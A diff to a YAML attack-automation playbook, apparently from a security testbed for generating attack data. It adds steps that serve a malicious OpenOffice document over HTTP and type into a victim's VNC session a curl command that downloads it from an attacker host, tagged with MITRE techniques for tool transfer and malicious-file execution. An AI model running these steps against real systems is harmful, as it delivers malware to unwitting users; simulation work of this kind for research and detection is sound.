@@ -25,6 +25,14 @@ commands:
     creates_session: tunnel
     cmd: "ssh -i /home/aecid/.ssh/attacker  -o StrictHostKeyChecking=no -L 5902:$CLIENT_IP:$CLIENT_VNC_PORT $MGMT_USERNAME@$MGMT_IP \n"
 
+################### SERVE THE OPEN OFFICE DOCUMENT ############################
+
+  # serve payload via http
+  - type: webserv
+    local_path: /home/aecid/Nutzungshinweise.odt
+    port: 8086
+    background: True
+
 ################### SERVE VEILTRANSFER CLIENT ############################
 
   # serve payload via http
@@ -106,6 +114,26 @@ commands:
     cmd: type 
     input: echo 'Dummy Text' | xclip -selection clipboard
     session: client
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: client
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc 
+    cmd: type 
+    input: "curl -o /home/judy/Nutzungshinweise.odt dailynews-wire.com:8086/index"
+    session: client
+    metadata:
+      techniques: "T1105,T1204.002"
+      tactics: "Command and Control, Execution"
+      technique_name: "Ingress Tool Transfer,User Execution: Malicious File"
 
   - type: sleep
     seconds: 3
